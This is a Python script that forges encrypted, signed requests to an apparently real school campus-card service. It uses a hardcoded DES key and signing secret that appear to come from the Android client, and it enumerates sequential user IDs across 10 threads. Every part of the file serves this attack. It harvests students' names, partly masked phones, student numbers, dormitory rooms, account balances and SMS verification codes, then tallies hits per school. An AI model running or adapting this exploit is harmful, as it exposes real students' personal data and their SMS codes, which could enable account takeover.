import hashlib, json, time, random
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad, unpad

START = 300000
COUNT = 40
THREADS = 10

BASE_URL = "http://schoolv3and.denengny.com"
KEY = IV = b'a1@998#.'

def enc(s):
    return DES.new(KEY, DES.MODE_CBC, IV).encrypt(pad(s.encode(), 8)).hex().upper()

def dec(h):
    return json.loads(unpad(DES.new(KEY, DES.MODE_CBC, IV).decrypt(bytes.fromhex(h.strip())), 8).decode())

def sign(ts):
    return hashlib.md5((ts + 'a1@998#.').encode()).hexdigest().lower()

def fetch(uid):
    ts = time.strftime('%Y%m%d%H%M%S') + str(random.randint(10, 99))
    body = enc(json.dumps({"USI_Id": uid, "Page_Name": "test", "ver": "Android-1.0.32", "timestamp": ts, "sign": sign(ts)})).encode()
    req = urllib.request.Request(f"{BASE_URL}/Student/Get_UserInfo_Detail", data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                 "User-Agent": "okhttp/3.3.1", "Host": "schoolv3and.denengny.com", "Accept-Encoding": "identity"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            resp = dec(r.read().decode())
    except:
        return None
    if resp.get('code') != 1:
        return None
    d = resp['data']
    if uid == START:
        print("[*] 字段列表:", list(d.keys()))
    phone = d.get('USI_Mobile', '')
    return {
        "id": uid,
        "name": d.get('USI_TrueName', ''),
        "phone": phone[:3] + '****' + phone[7:] if len(phone) == 11 else phone,
        "school_no": d.get('USI_SchoolNo', ''),
        "room": d.get('USI_SchoolRoomNo', ''),
        "sex": d.get('USI_Sex', ''),
        "balance": d.get('USI_MainBalance', 0),
        "sms_code": d.get('USI_SMSCode', ''),
        "school": d.get('SI_Name', ''),
    }

ids = list(range(START, START + COUNT))
results = {}
with ThreadPoolExecutor(max_workers=THREADS) as ex:
    futs = {ex.submit(fetch, uid): uid for uid in ids}
    for f in as_completed(futs):
        results[futs[f]] = f.result()

rows = [(uid, results[uid]) for uid in ids]

print(f"\n{'ID':<10} {'姓名':<8} {'手机':<14} {'学号':<20} {'宿舍':<20} {'性别':<4} {'余额':>6}  {'短信码':<8}  {'学校'}")
print("-" * 110)
for uid, r in rows:
    if r:
        print(f"{uid:<10} {r['name']:<8} {r['phone']:<14} {r['school_no']:<20} {r['room']:<20} {r['sex']:<4} {r['balance']:>6}  {r['sms_code']:<8}  {r['school']}")
    else:
        print(f"{uid:<10} 无效")

valid = [r for _, r in rows if r]
print(f"\n命中 {len(valid)}/{COUNT}，命中率 {len(valid)/COUNT*100:.0f}%")
schools = {}
for r in valid:
    schools[r['school']] = schools.get(r['school'], 0) + 1
for s, n in sorted(schools.items(), key=lambda x: -x[1]):
    print(f"  {s}: {n}人")
